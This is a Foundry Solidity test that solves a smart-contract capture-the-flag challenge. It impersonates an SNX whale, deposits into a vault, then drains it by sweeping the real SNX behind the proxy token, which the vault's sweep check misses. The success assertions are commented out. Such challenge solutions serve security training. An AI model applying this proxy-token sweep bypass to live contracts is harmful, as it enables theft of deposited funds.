// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "src/miscs/ProxyERC20.sol";
import "src/miscs/HodlChallenge.sol";

contract TesHodlChallenge is BaseTest {
    address constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address constant SNX_WHALE = 0xF977814e90dA44bFA03b6295A0616a897441aceC; // binance8

    HodlChallenge private challenge;
    HodlVault private vault;
    ProxyERC20 private snx;

    address private player;
    address private player2;

    constructor() {
        // Created (during `setUp()`) users will be available in `users` state variable

        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player 2";
        preSetUp(userLabels.length, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        challenge = new HodlChallenge();
        snx = ProxyERC20(SNX);
        vault = HodlVault(challenge.vault());
        player = address(SNX_WHALE);
        vm.deal(player, 10_000 ether);
        player2 = users[0];

        assertEq(snx.name(), "Synthetix Network Token");
    }

    function testExploit() public {
        vm.startPrank(player);

        // deposit SNX
        uint256 amotToDeposit = snx.balanceOf(SNX_WHALE);
        snx.approve(address(vault), amotToDeposit);
        vault.hold(amotToDeposit);

        vm.stopPrank();

        runTest();
    }

    function exploit() internal override {
        vm.startPrank(player);

        // The `vault` contract has a correct check to not allow to `sweep` the underlying token (SNX)
        // but it's not preventing us to sweep the SNX (that is a ProxyERC20) target token (that is the "real" SNX)
        vault.sweep(snx.target());

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        // assertEq(vault.holdMethodIsCalled(), true);
        // assertEq(challenge.isSolved(), true);
    }
}
